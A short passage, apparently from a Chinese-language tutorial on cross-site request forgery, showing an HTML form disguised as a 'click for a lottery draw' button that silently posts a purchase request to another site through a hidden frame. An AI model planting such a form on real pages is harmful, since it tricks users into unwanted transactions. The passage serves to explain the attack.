...
![](https://i.imgur.com/x3bCTTr.png =60%x)
...
<form
  action="http://movie.com/buy.php"
  target="csrf-frame"
  id="csrf-frame"
  method="POST"
>
  <input type="hidden" name="id" value="12334445" />
  <button type="submit">點我抽獎</button>
</form>
```

透過 `target="csrf-frame"` 可以讓使用者點擊按鈕時，隱藏掉 form 的跳轉行為，當使用者點擊按鈕，就會發送在某網站買東西的請求。
